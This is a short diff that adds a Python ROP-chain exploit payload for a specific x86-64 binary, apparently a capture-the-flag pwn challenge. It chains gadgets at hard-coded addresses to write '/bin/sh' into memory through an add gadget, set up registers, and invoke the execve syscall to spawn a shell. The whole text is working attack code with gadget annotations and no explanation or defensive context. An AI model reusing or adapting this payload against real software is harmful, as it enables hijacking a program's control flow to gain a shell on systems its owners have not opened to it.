@@ -1,0 +1,29 @@
+payload = p64(0x403649)
+#0x0000000000403649: pop rbx; pop rbp; ret; 
+payload += p64(0x80)+p64(0x4081ce)+p64(0x40125c)
+# 0x40125c: add dword ptr [rbp - 0x3d], ebx ; nop ; ret
+payload += p64(0x403649)
+# 0x0000000000403649: pop rbx; pop rbp; ret; 
+payload += p64(0x6e69622f)+p64(0x4080ad)+p64(0x40125c)
+# 0x40125c: add dword ptr [rbp - 0x3d], ebx ; nop ; ret
+payload += p64(0x403649)
+# 0x0000000000403649: pop rbx; pop rbp; ret; 
+payload += p64(0x68662f)+p64(0x4080b1)+p64(0x40125c)
+# 0x40125c: add dword ptr [rbp - 0x3d], ebx ; nop ; ret
+payload += p64(0x4017d3)
+# 0x00000000004017d3: pop rdi; ret; 
+payload += p64(0x408070)+p64(0x4017d1)
+# 0x00000000004017d1: pop rsi; pop r15; ret; 
+payload += p64(0x0)+p64(0x0)+p64(0x40125d)
+# 0x000000000040125d: pop rbp; ret; 
+payload += p64(0x36b07fa6)+p64(0x40371b)
+# 0x000000000040371b: mov eax, ebp; pop rbx; pop rbp; ret; 
+payload += p64(0x0)+p64(0x0)+p64(0x401553)
+# 0x0000000000401553: add edx, dword ptr [rax - 0x366ffe15]; ret; 
+payload += p64(0x40125d)
+# 0x000000000040125d: pop rbp; ret; 
+payload += p64(0x3b)+p64(0x40371b)
+# 0x000000000040371b: mov eax, ebp; pop rbx; pop rbp; ret; 
+payload += p64(0x0)+p64(0x0)+p64(0x4030e0)
+# 0x00000000004030e0: syscall; 
+payload += b''
